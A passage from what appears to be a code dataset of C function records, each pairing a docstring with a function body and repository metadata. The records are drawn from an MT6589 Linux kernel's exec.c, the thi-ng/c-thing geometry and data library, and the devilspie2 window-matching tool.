{\n\t\t\twrite_lock_irq(&tasklist_lock);\n\t\t\tif (likely(leader->exit_state))\n\t\t\t\tbreak;\n\t\t\t__set_current_state(TASK_UNINTERRUPTIBLE);\n\t\t\twrite_unlock_irq(&tasklist_lock);\n\t\t\tschedule();\n\t\t}\n\n\t\t/*\n\t\t * The only record we have of the real-time age of a\n\t\t * process, regardless of execs it's done, is start_time.\n\t\t * All the past CPU time is accumulated in signal_struct\n\t\t * from sister threads now dead.  But in this non-leader\n\t\t * exec, nothing survives from the original leader thread,\n\t\t * whose birth marks the true age of this process now.\n\t\t * When we take on its identity by switching to its PID, we\n\t\t * also take its birthdate (always earlier than our own).\n\t\t */\n\t\ttsk->start_time = leader->start_time;\n\n\t\tBUG_ON(!same_thread_group(leader, tsk));\n\t\tBUG_ON(has_group_leader_pid(tsk));\n\t\t/*\n\t\t * An exec() starts a new thread group with the\n\t\t * TGID of the previous thread group. Rehash the\n\t\t * two threads with a switched PID, and release\n\t\t * the former thread group leader:\n\t\t */\n\n\t\t/* Become a process group leader with the old leader's pid.\n\t\t * The old leader becomes a thread of the this thread group.\n\t\t * Note: The old leader also uses this pid until release_task\n\t\t *       is called.  Odd but simple and correct.\n\t\t */\n\t\tdetach_pid(tsk, PIDTYPE_PID);\n\t\ttsk->pid = leader->pid;\n\t\tattach_pid(tsk, PIDTYPE_PID,  task_pid(leader));\n\t\ttransfer_pid(leader, tsk, PIDTYPE_PGID);\n\t\ttransfer_pid(leader, tsk, PIDTYPE_SID);\n\n\t\tlist_replace_rcu(&leader->tasks, &tsk->tasks);\n\t\tlist_replace_init(&leader->sibling, &tsk->sibling);\n\n\t\ttsk->group_leader = tsk;\n\t\tleader->group_leader = tsk;\n\n\t\ttsk->exit_signal = SIGCHLD;\n\t\tleader->exit_signal = -1;\n\n\t\tBUG_ON(leader->exit_state != EXIT_ZOMBIE);\n\t\tleader->exit_state = EXIT_DEAD;\n\n\t\t/*\n\t\t * We are going to release_task()->ptrace_unlink() silently,\n\t\t * the tracer can sleep in do_wait(). EXIT_DEAD guarantees\n\t\t * the tracer wont't block again waiting for this thread.\n\t\t */\n\t\tif (unlikely(leader->ptrace))\n\t\t\t__wake_up_parent(leader, leader->parent);\n\t\twrite_unlock_irq(&tasklist_lock);\n\n\t\trelease_task(leader);\n\t}\n\n\tsig->group_exit_task = NULL;\n\tsig->notify_count = 0;\n\nno_thread_group:\n\t/* we have changed execution domain */\n\ttsk->exit_signal = SIGCHLD;\n\n\texit_itimers(sig);\n\tflush_itimer_signals();\n\n\tif (atomic_read(&oldsighand->count) != 1) {\n\t\tstruct sighand_struct *newsighand;\n\t\t/*\n\t\t * This ->sighand is shared with the CLONE_SIGHAND\n\t\t * but not CLONE_THREAD task, switch to the new one.\n\t\t */\n\t\tnewsighand = kmem_cache_alloc(sighand_cachep, GFP_KERNEL);\n\t\tif (!newsighand)\n\t\t\treturn -ENOMEM;\n\n\t\tatomic_set(&newsighand->count, 1);\n\t\tmemcpy(newsighand->action, oldsighand->action,\n\t\t       sizeof(newsighand->action));\n\n\t\twrite_lock_irq(&tasklist_lock);\n\t\tspin_lock(&oldsighand->siglock);\n\t\trcu_assign_pointer(tsk->sighand, newsighand);\n\t\tspin_unlock(&oldsighand->siglock);\n\t\twrite_unlock_irq(&tasklist_lock);\n\n\t\t__cleanup_sighand(oldsighand);\n\t}\n\n\tBUG_ON(!thread_group_leader(tsk));\n\treturn 0;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * install the new credentials for this executable\n */\n", "func_signal": "void install_exec_creds(struct linux_binprm *bprm)", "code": "{\n\tsecurity_bprm_committing_creds(bprm);\n\n\tcommit_creds(bprm->cred);\n\tbprm->cred = NULL;\n\t/*\n\t * cred_guard_mutex must be held at least to this point to prevent\n\t * ptrace_attach() from altering our determination of the task's\n\t * credentials; any time after this it may be unlocked.\n\t */\n\tsecurity_bprm_committed_creds(bprm);\n\tmutex_unlock(&current->signal->cred_guard_mutex);\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * During bprm_mm_init(), we create a temporary stack at STACK_TOP_MAX.  Once\n * the binfmt code determines where the new stack should reside, we shift it to\n * its final location.  The process proceeds as follows:\n *\n * 1) Use shift to calculate the new vma endpoints.\n * 2) Extend vma to cover both the old and new ranges.  This ensures the\n *    arguments passed to subsequent functions are consistent.\n * 3) Move vma's page tables to the new range.\n * 4) Free up any cleared pgd range.\n * 5) Shrink the vma to cover only the new range.\n */\n", "func_signal": "static int shift_arg_pages(struct vm_area_struct *vma, unsigned long shift)", "code": "{\n\tstruct mm_struct *mm = vma->vm_mm;\n\tunsigned long old_start = vma->vm_start;\n\tunsigned long old_end = vma->vm_end;\n\tunsigned long length = old_end - old_start;\n\tunsigned long new_start = old_start - shift;\n\tunsigned long new_end = old_end - shift;\n\tstruct mmu_gather tlb;\n\n\tBUG_ON(new_start > new_end);\n\n\t/*\n\t * ensure there are no vmas between where we want to go\n\t * and where we are\n\t */\n\tif (vma != find_vma(mm, new_start))\n\t\treturn -EFAULT;\n\n\t/*\n\t * cover the whole range: [new_start, old_end)\n\t */\n\tif (vma_adjust(vma, new_start, old_end, vma->vm_pgoff, NULL))\n\t\treturn -ENOMEM;\n\n\t/*\n\t * move the page tables downwards, on failure we rely on\n\t * process cleanup to remove whatever mess we made.\n\t */\n\tif (length != move_page_tables(vma, old_start,\n\t\t\t\t       vma, new_start, length))\n\t\treturn -ENOMEM;\n\n\tlru_add_drain();\n\ttlb_gather_mmu(&tlb, mm, 0);\n\tif (new_end > old_start) {\n\t\t/*\n\t\t * when the old and new regions overlap clear from new_end.\n\t\t */\n\t\tfree_pgd_range(&tlb, new_end, old_end, new_end,\n\t\t\tvma->vm_next ? vma->vm_next->vm_start : 0);\n\t} else {\n\t\t/*\n\t\t * otherwise, clean from old_start; this is done to not touch\n\t\t * the address space in [new_end, old_start) some architectures\n\t\t * have constraints on va-space that make this illegal (IA64) -\n\t\t * for the others its just a little faster.\n\t\t */\n\t\tfree_pgd_range(&tlb, old_start, old_end, new_end,\n\t\t\tvma->vm_next ? vma->vm_next->vm_start : 0);\n\t}\n\ttlb_finish_mmu(&tlb, new_end, old_end);\n\n\t/*\n\t * Shrink the vma to just the new range.  Always succeeds.\n\t */\n\tvma_adjust(vma, new_start, new_end, vma->vm_pgoff, NULL);\n\n\treturn 0;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * Like copy_strings, but get argv and its values from kernel memory.\n */\n", "func_signal": "int copy_strings_kernel(int argc, const char *const *__argv,\n\t\t\tstruct linux_binprm *bprm)", "code": "{\n\tint r;\n\tmm_segment_t oldfs = get_fs();\n\tstruct user_arg_ptr argv = {\n\t\t.ptr.native = (const char __user *const  __user *)__argv,\n\t};\n\n\tset_fs(KERNEL_DS);\n\tr = copy_strings(argc, argv, bprm);\n\tset_fs(oldfs);\n\n\treturn r;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * Arguments are '\\0' separated strings found at the location bprm->p\n * points to; chop off the first by relocating brpm->p to right after\n * the first '\\0' encountered.\n */\n", "func_signal": "int remove_arg_zero(struct linux_binprm *bprm)", "code": "{\n\tint ret = 0;\n\tunsigned long offset;\n\tchar *kaddr;\n\tstruct page *page;\n\n\tif (!bprm->argc)\n\t\treturn 0;\n\n\tdo {\n\t\toffset = bprm->p & ~PAGE_MASK;\n\t\tpage = get_arg_page(bprm, bprm->p, 0);\n\t\tif (!page) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\t\tkaddr = kmap_atomic(page);\n\n\t\tfor (; offset < PAGE_SIZE && kaddr[offset];\n\t\t\t\toffset++, bprm->p++)\n\t\t\t;\n\n\t\tkunmap_atomic(kaddr);\n\t\tput_arg_page(page);\n\n\t\tif (offset == PAGE_SIZE)\n\t\t\tfree_arg_page(bprm, (bprm->p >> PAGE_SHIFT) - 1);\n\t} while (offset == PAGE_SIZE);\n\n\tbprm->p++;\n\tbprm->argc--;\n\tret = 0;\n\nout:\n\treturn ret;\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "/*\n * These functions flushes out all traces of the currently running executable\n * so that a new one can be started\n */\n", "func_signal": "static void flush_old_files(struct files_struct * files)", "code": "{\n\tlong j = -1;\n\tstruct fdtable *fdt;\n\n\tspin_lock(&files->file_lock);\n\tfor (;;) {\n\t\tunsigned long set, i;\n\n\t\tj++;\n\t\ti = j * __NFDBITS;\n\t\tfdt = files_fdtable(files);\n\t\tif (i >= fdt->max_fds)\n\t\t\tbreak;\n\t\tset = fdt->close_on_exec[j];\n\t\tif (!set)\n\t\t\tcontinue;\n\t\tfdt->close_on_exec[j] = 0;\n\t\tspin_unlock(&files->file_lock);\n\t\tfor ( ; set ; i++,set >>= 1) {\n\t\t\tif (set & 1) {\n\t\t\t\tsys_close(i);\n\t\t\t}\n\t\t}\n\t\tspin_lock(&files->file_lock);\n\n\t}\n\tspin_unlock(&files->file_lock);\n}", "path": "kernel\\fs\\exec.c", "repo_name": "varunchitre15/MT6589_kernel_source", "stars": 77, "license": "None", "language": "c", "size": 201295}
{"docstring": "// #endif\n", "func_signal": "void *ct_array_reverse(const void *src, size_t num, size_t stride, void *dest)", "code": "{\n  CT_CHECK(stride <= 128, \"stride > 128\");\n  uint8_t *s = (uint8_t *)src;\n  uint8_t *d = (uint8_t *)dest;\n  for (size_t i = 0, len = num * stride, end = len - stride; i < len;\n       i += stride, end -= stride) {\n    memcpy(&d[end], &s[i], stride);\n  }\n  return dest;\nfail:\n  return NULL;\n}", "path": "src\\data\\array.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "/* Enumerate edge quads */\n", "func_signal": "static void ct_qedge_do_iter(CT_QuadEdgeRef e,\n                             CT_QuadEdgeVisitor visit,\n                             void *state,\n                             size_t mark)", "code": "{\n  while (MARK(e) != mark) {\n    visit(e, state);\n    MARK(e) = mark;\n    ct_qedge_do_iter(ONEXT(SYM(e)), visit, state, mark);\n    e = ONEXT(e);\n  }\n}", "path": "src\\geom\\quadedge.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// TODO verify why slower...\n/*\n#ifdef CT_FEATURE_SSE\n#include <xmmintrin.h>\n\nvoid *ct_array_reverse8_imm(void *ptr, size_t num) {\n  __m64 *iptr = (__m64*)ptr;\n  for (size_t i = 0, n2 = num >> 1, end = num - 1; i < n2; i++, end--) {\n    //CT_INFO(\"swap: %p, %p\", &iptr[i], &iptr[end]);\n    CT_SWAP(__m64, iptr[i], iptr[end]);\n  }\n  return ptr;\n}\n\n#else */\n", "func_signal": "void *ct_array_reverse8_imm(void *ptr, size_t num)", "code": "{\n  uint32_t *iptr = (uint32_t *)ptr;\n  for (size_t i = 0, end = num * 2 - 2; i < num; i += 2, end -= 2) {\n    CT_SWAP(uint32_t, iptr[i], iptr[end]);\n    CT_SWAP(uint32_t, iptr[i + 1], iptr[end + 1]);\n  }\n  return ptr;\n}", "path": "src\\data\\array.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// TODO reset mpools\n", "func_signal": "ct_export void ct_voronoi_compute(CT_Voronoi *vor,\n                                  CT_Vec2f *sites,\n                                  size_t num,\n                                  CT_VOEdgeHandler handler,\n                                  void *state)", "code": "{\n  CT_Vec2f min, max, candidate;\n  CT_VOVertex *newsite, *p;\n  CT_VOEdgeList *el = &vor->halfEdges;\n  CT_VOHeap *heap   = &vor->heap;\n\n  ct_bounds2fp((float *)sites, num, 2, &min, &max);\n  qsort(sites, num, sizeof(CT_Vec2f), ct_compare2fv_yx);\n  el->minx     = min.x;\n  el->deltax   = max.x - min.x;\n  heap->miny   = min.y;\n  heap->deltay = max.y - min.y;\n\n  vor->numVertices = 0;\n  vor->numEdges    = 0;\n  vor->numSites    = 0;\n  vor->first       = provide_next_site(vor, sites, num);\n  newsite          = provide_next_site(vor, sites, num);\n\n  while (1) {\n    if (!heap_is_empty(heap)) {\n      candidate = heap_get_min(heap);\n    }\n\n    if (newsite &&\n        (heap_is_empty(heap) || newsite->pos.y < candidate.y ||\n         (newsite->pos.y == candidate.y && newsite->pos.x < candidate.x))) {\n      // new site is smallest\n      CT_VOHalfEdge *lbnd     = edgelist_leftbnd(el, &newsite->pos);\n      CT_VOHalfEdge *rbnd     = lbnd->right;\n      CT_VOVertex *bot        = rightreg(lbnd, vor->first);\n      CT_VOEdge *e            = bisect(vor, bot, newsite);\n      CT_VOHalfEdge *bisector = make_halfedge(el, e, 0);\n      edgelist_insert(lbnd, bisector);\n      if ((p = intersect(vor, lbnd, bisector))) {\n        heap_delete(heap, lbnd, &vor->vpool);\n        heap_insert(heap, lbnd, p, ct_dist2fv(&p->pos, &newsite->pos));\n      }\n      lbnd     = bisector;\n      bisector = make_halfedge(el, e, 1);\n      edgelist_insert(lbnd, bisector);\n      if ((p = intersect(vor, bisector, rbnd))) {\n        heap_insert(heap, bisector, p, ct_dist2fv(&p->pos, &newsite->pos));\n      }\n      newsite = provide_next_site(vor, sites, num);\n    } else if (!heap_is_empty(heap)) {\n      // isec is smallest\n      CT_VOHalfEdge *lbnd  = heap_extract_min(heap);\n      CT_VOHalfEdge *llbnd = lbnd->left;\n      CT_VOHalfEdge *rbnd  = lbnd->right;\n      CT_VOHalfEdge *rrbnd = rbnd->right;\n      CT_VOVertex *bot     = leftreg(lbnd, vor->first);\n      CT_VOVertex *top     = rightreg(rbnd, vor->first);\n      CT_VOVertex *v       = set_vertex_id(vor, lbnd->vertex);\n      edge_set_endpoint(vor, lbnd->parent, lbnd->side, v, handler, state);\n      edge_set_endpoint(vor, rbnd->parent, rbnd->side, v, handler, state);\n      halfedge_delete(lbnd);\n      heap_delete(heap, rbnd, &vor->vpool);\n      halfedge_delete(rbnd);\n      int side = 0;\n      if (bot->pos.y > top->pos.y) {\n        CT_VOVertex *temp = bot;\n        bot               = top;\n        top               = temp;\n        side              = 1;\n      }\n      CT_VOEdge *e            = bisect(vor, bot, top);\n      CT_VOHalfEdge *bisector = make_halfedge(el, e, side);\n      edgelist_insert(llbnd, bisector);\n      edge_set_endpoint(vor, e, 1 - side, v, handler, state);\n      dec_ref(&vor->vpool, v);\n      if ((p = intersect(vor, llbnd, bisector))) {\n        heap_delete(heap, llbnd, &vor->vpool);\n        heap_insert(heap, llbnd, p, ct_dist2fv(&p->pos, &bot->pos));\n      }\n      if ((p = intersect(vor, bisector, rrbnd))) {\n        heap_insert(heap, bisector, p, ct_dist2fv(&p->pos, &bot->pos));\n      }\n    } else\n      break;\n  }\n  CT_VOHalfEdge *he = vor->halfEdges.leftend->right;\n  while (he != vor->halfEdges.rightend) {\n    handler(he->parent, state);\n    he = he->right;\n  }\n}", "path": "src\\geom\\voronoi.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// clang-format on\n", "func_signal": "int ct_object_print(CT_Object *o, FILE *out)", "code": "{\n  CT_CHECK(__impls_iprint[o->tag.type].print, \"missing impl for type: %u\",\n           o->tag.type);\n  return __impls_iprint[o->tag.type].print(o, out);\nfail:\n  return -1;\n}", "path": "src\\data\\object.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "/* Splice primitive: */\n", "func_signal": "ct_export void ct_qedge_splice(CT_QuadEdgeRef a, CT_QuadEdgeRef b)", "code": "{\n  CT_QuadEdgeRef ta, tb;\n  CT_QuadEdgeRef alpha = ROT(ONEXT(a));\n  CT_QuadEdgeRef beta  = ROT(ONEXT(b));\n\n  ta           = ONEXT(a);\n  tb           = ONEXT(b);\n  ONEXT(a)     = tb;\n  ONEXT(b)     = ta;\n  ta           = ONEXT(alpha);\n  tb           = ONEXT(beta);\n  ONEXT(alpha) = tb;\n  ONEXT(beta)  = ta;\n}", "path": "src\\geom\\quadedge.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "///// public functions\n", "func_signal": "ct_export int ct_voronoi_init(CT_Voronoi *vor, size_t num)", "code": "{\n  return (ct_mpool_init(&vor->vpool, 2 * num, sizeof(CT_VOVertex)) ||\n          ct_mpool_init(&vor->epool, num, sizeof(CT_VOEdge)) ||\n          edgelist_init(&vor->halfEdges, 2 * num) ||\n          heap_init(&vor->heap, num));\n}", "path": "src\\geom\\voronoi.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// clang-format off\n/*\nCT_IArea __ct_iarea_circle2 = {\n  .area = ct_circle2f_area\n};\n\nCT_ICircumference __ct_icircumference_circle2 = {\n  .circumference = ct_circle2f_circumference\n};\n\nCT_IClassify __ct_iclassify_circle2 = {\n  .classify_point2f = ct_circle2f_classify_point,\n  .classify_point3f = NULL\n};\n*/\n// clang-format off\n", "func_signal": "ct_export CT_Circle2f *ct_circle2f_init(CT_Circle2f *c, float x, float y,\n                                        float r)", "code": "{\n  c->pos.x = x;\n  c->pos.y = y;\n  c->r = r;\n  return c;\n}", "path": "src\\geom\\circle.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "//extern CT_IArea __ct_iarea_circle2;\n//extern CT_ICircumference __ct_icircumference_circle2;\n", "func_signal": "CT_TEST_DECLS\n\nint test_circle()", "code": "{\n  CT_Circle2f c, c2;\n  ct_circle2f_initr(&c, 1);\n  ct_circle2f_initr(&c2, 2);\n  CT_IS(CT_PI == ct_circle2f_area(&c), \"area c\");\n  CT_IS(CT_PI * 4 == ct_circle2f_area(&c2), \"area c2\");\n  CT_IS(CT_TAU == ct_circle2f_circumference(&c), \"circum c\");\n  CT_IS(CT_TAU * 2 == ct_circle2f_circumference(&c2), \"circum c2\");\n  CT_Vec2f p = {.x = 0, .y = 0};\n  CT_IS(1 == ct_circle2f_classify_point(&c, &p), \"classify 1\");\n  CT_IS(0 == ct_circle2f_classify_point(&c, ct_set2fxy(&p, 1, 0)),\n        \"classify 0\");\n  CT_IS(-1 == ct_circle2f_classify_point(&c, ct_set2fxy(&p, 1.001f, 0)),\n        \"classify -1\");\n  return 0;\n}", "path": "test\\circle.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "/// polygon offsetting\n", "func_signal": "static void trace_edge(const CT_PolyEdge *e)", "code": "{\n  CT_DEBUG(\"e: %f,%f -> %f,%f n: %f,%f\", e->curr.x, e->curr.y, e->next.x,\n           e->next.y, e->normal.x, e->normal.y);\n}", "path": "src\\geom\\polygon.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// http://www.inf.usi.ch/hormann/papers/Greiner.1998.ECO.pdf\n// http://davis.wpi.edu/~matt/courses/clipping/\n// http://syntheti.cc/article/polygon-clipping/\n// https://github.com/tcql/greiner-hormann/\n// https://github.com/w8r/GreinerHormann/\n", "func_signal": "static CT_PolyVertex *init_vertex(CT_PolyVertex *v, const CT_Vec2f *pos)", "code": "{\n  v->pos     = *pos;\n  v->next    = NULL;\n  v->prev    = NULL;\n  v->pair    = NULL;\n  v->isec    = 0;\n  v->entry   = 1;\n  v->visited = 0;\n  v->dist    = 0;\n  return v;\n}", "path": "src\\geom\\polygon.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// clang-format on\n", "func_signal": "static void write_edge(CT_VOEdge *e, void *_)", "code": "{\n  CT_VOVertex *a = e->ep[0], *b = e->ep[1];\n  if (a && b) {\n    ct_svg_write_line2fv(stdout, &a->pos, &b->pos, NULL);\n  }\n}", "path": "examples\\voronoi\\main.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// ---------- array ops\n", "func_signal": "VEC_ARRAYOP(translate2f, CT_Vec2f, float, ct_add2fv_imm)\nVEC_ARRAYOP(scale2f, CT_Vec2f, float, ct_mul2fv_imm)\nVEC_ARRAYOP(translate3f, CT_Vec3f, float, ct_add3fv_imm)\nVEC_ARRAYOP(scale3f, CT_Vec3f, float, ct_mul3fv_imm)\nVEC_ARRAYOP(translate4f, CT_Vec4f, float, ct_add4fv_imm)\nVEC_ARRAYOP(scale4f, CT_Vec4f, float, ct_mul4fv_imm)\n\nct_export CT_Vec2f *ct_centroid2f(float *ptr,\n                                  size_t num,\n                                  size_t fstride,\n                                  CT_Vec2f *out)", "code": "{\n  float x  = 0;\n  float y  = 0;\n  size_t n = num;\n  while (n--) {\n    x += ptr[0];\n    y += ptr[1];\n    ptr += fstride;\n  }\n  ct_set2fxy(out, x / num, y / num);\n  return out;\n}", "path": "src\\math\\vec.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "//// double-linked list\n", "func_signal": "ct_export CT_ConsD* ct_consd(void* val, CT_ConsD* head, CT_MPool* pool)", "code": "{\n  CT_ConsD* cell;\n  CT_CHECK_MEM(cell = CT_MP_ALLOC(pool, CT_ConsD));\n  cell->value = val;\n  cell->next  = head;\n  if (head) {\n    head->prev = cell;\n  }\nfail:\n  return cell;\n}", "path": "src\\data\\cons.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// TODO swap prev & pos ptr to avoid copying\n", "func_signal": "static void inertia2d(CT_Verlet *v)", "code": "{\n  float *pos  = v->pos;\n  float *prev = v->prev;\n  for (size_t num = v->numP << 1, i = 0; i < num; i += 2) {\n    const float x = pos[i] * 2.0f - prev[i];\n    const float y = pos[i + 1] * 2.0f - prev[i + 1];\n    prev[i]       = pos[i];\n    prev[i + 1]   = pos[i + 1];\n    ct_spgrid_update(&v->accel, &pos[i], FVEC(x, y), (void *)i);\n    pos[i]     = x;\n    pos[i + 1] = y;\n  }\n}", "path": "src\\sim\\verlet.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "/* Delete an edge: */\n", "func_signal": "ct_export void ct_qedge_destroy(CT_QuadEdgeRef e)", "code": "{\n  CT_QuadEdgeRef f = SYM(e);\n  if (ONEXT(e) != e) {\n    ct_qedge_splice(e, OPREV(e));\n  }\n  if (ONEXT(f) != f) {\n    ct_qedge_splice(f, OPREV(f));\n  }\n  free((uint8_t *)QE_MASK(e));\n}", "path": "src\\geom\\quadedge.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// clang-format on\n", "func_signal": "int ct_object_tostring(CT_Object *o, char *buf, int bsize)", "code": "{\n  CT_CHECK(bsize > 0, \"buffer full\");\n  CT_CHECK(__impls_itostring[o->tag.type].tostring, \"missing impl for type: %u\",\n           o->tag.type);\n  return __impls_itostring[o->tag.type].tostring(o, buf, bsize);\nfail:\n  return -1;\n}", "path": "src\\data\\object.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// public functions\n", "func_signal": "int ct_polygon2f_init(CT_Polygon2f *poly, CT_Vec2f *points, size_t num)", "code": "{\n  poly->first     = NULL;\n  poly->firstIsec = NULL;\n  poly->lastProc  = NULL;\n  poly->num       = 0;\n  if (!ct_mpool_init(&poly->pool, CT_MAX(num, 16), sizeof(CT_PolyVertex))) {\n    if (points) {\n      for (size_t i = 0; i < num; i++) {\n        ct_polygon2f_add_vertex(poly, &points[i]);\n      }\n    }\n    return 0;\n  }\n  return 1;\n}", "path": "src\\geom\\polygon.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// clang-format on\n", "func_signal": "static float disc_gen(CT_Quadtree *t, CT_Circle2f *disc, void *s)", "code": "{\n  ct_set2fxy(&disc->pos, ct_rand_normpos() * t->root.w,\n             ct_rand_normpos() * t->root.h);\n  size_t x        = (size_t)disc->pos.x;\n  size_t y        = (size_t)disc->pos.y;\n  AppState *state = (AppState *)s;\n  float tt        = (float)state->image[y * state->width + x] / 255.f;\n  if (state->invert) {\n    tt = 1.0f - tt;\n  }\n  return disc->r =\n             ct_mixf(state->minDist, state->maxDist, powf(tt, state->gamma));\n}", "path": "examples\\poisson\\main.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "// clang-format on\n", "func_signal": "ct_inline CT_Vec3f *rand_particle(DLA *dla)", "code": "{\n  return ct_set3fxyz(&dla->particles[dla->num++],\n                     ct_rand_normpos() * dla->width,\n                     ct_rand_normpos() * dla->height, 0);\n}", "path": "examples\\dla\\main.c", "repo_name": "thi-ng/c-thing", "stars": 103, "license": "apache-2.0", "language": "c", "size": 6323}
{"docstring": "/**\n *\n */\n", "func_signal": "int\nload_script(lua_State *lua,char *filename)", "code": "{\n\tif (lua) {\n\t\tint result=luaL_loadfile(lua,filename);\n\n\t\tif (!result) {\n\t\t\tscript_loaded=TRUE;\n\t\t} else {\n\n\t\t\t// We got an error, print it\n\t\t\tprintf(\"%s\\n\",lua_tostring(lua,-1));\n\n\t\t\tlua_pop(lua,1);\n\n\t\t\treturn -1;\n\t\t}\n\t} else {\n\t\treturn -1;\n\t}\n\n\treturn 0;\n}", "path": "src\\script.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "void done_script_error_messages()", "code": "{\n\tg_free(no_indata_expected_error);\n\tg_free(one_indata_expected_error);\n\tg_free(two_indata_expected_error);\n\tg_free(four_indata_expected_error);\n\n\tg_free(number_expected_as_indata_error);\n\tg_free(boolean_expected_as_indata_error);\n\tg_free(string_expected_as_indata_error);\n\n\tg_free(integer_greater_than_zero_expected_error);\n\tg_free(could_not_find_current_viewport_error);\n\tg_free(setting_viewport_failed_error);\n\n\tg_free(failed_string);\n}", "path": "src\\error_strings.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "gboolean undecorate_window(Window xid)", "code": "{\n\tdevilspie2_error_trap_push();\n\n\tset_decorations(xid, FALSE);\n\n\tif (devilspie2_error_trap_pop()) {\n\t\tg_printerr(\"decorate_window %s\\n\", _(\"Failed!\"));\n\t\treturn FALSE;\n\t}\n\n\treturn TRUE;\n}", "path": "src\\xutils.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "void devilspie2_change_state(Screen *screen, Window xwindow,\n\t\t\t\t\t\t\tgboolean add,\n\t\t\t\t\t\t\tAtom     state1,\n\t\t\t\t\t\t\tAtom     state2)", "code": "{\n\tXEvent xev;\n\n#define _NET_WM_STATE_REMOVE        0    /* remove/unset property */\n#define _NET_WM_STATE_ADD           1    /* add/set property */\n#define _NET_WM_STATE_TOGGLE        2    /* toggle property  */\n\n\txev.xclient.type = ClientMessage;\n\txev.xclient.serial = 0;\n\txev.xclient.send_event = True;\n\txev.xclient.display = gdk_x11_get_default_xdisplay();\n\txev.xclient.window = xwindow;\n\txev.xclient.message_type = my_wnck_atom_get (\"_NET_WM_STATE\");\n\txev.xclient.format = 32;\n\txev.xclient.data.l[0] = add ? _NET_WM_STATE_ADD : _NET_WM_STATE_REMOVE;\n\txev.xclient.data.l[1] = state1;\n\txev.xclient.data.l[2] = state2;\n\n\tXSendEvent (gdk_x11_get_default_xdisplay(),\n\t\t\t\t\tRootWindowOfScreen (screen),\n\t\t\t\t\tFalse,\n\t\t\t\t\tSubstructureRedirectMask | SubstructureNotifyMask,\n\t\t\t\t\t&xev);\n}", "path": "src\\xutils.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "void\nregister_cfunctions(lua_State *lua)", "code": "{\n\tlua_register(lua, \"get_window_name\", c_get_window_name);\n\tlua_register(lua, \"get_window_has_name\", c_get_window_has_name);\n\n\tlua_register(lua, \"set_window_position\", c_set_window_position);\n\tlua_register(lua, \"set_window_position2\", c_set_window_position2);\n\tlua_register(lua, \"set_window_size\", c_set_window_size);\n\tlua_register(lua, \"set_window_strut\", c_set_window_strut);\n\n\tlua_register(lua, \"set_window_geometry\", c_set_window_geometry);\n\tlua_register(lua, \"set_window_geometry2\", c_set_window_geometry2);\n\n\tlua_register(lua, \"get_application_name\", c_get_application_name);\n\n\tlua_register(lua, \"make_always_on_top\", c_make_always_on_top);\n\n\tlua_register(lua, \"set_on_top\", c_set_on_top);\n\n\tlua_register(lua, \"debug_print\", c_debug_print);\n\n\tlua_register(lua, \"shade\", c_shade_window);\n\tlua_register(lua, \"unshade\", c_unshade_window);\n\n\tlua_register(lua, \"maximize\", c_maximize_window);\n\tlua_register(lua, \"maximize_horisontally\", c_maximize_window_horisontally);\n\tlua_register(lua, \"maximize_horizontally\", c_maximize_window_horisontally);\n\tlua_register(lua, 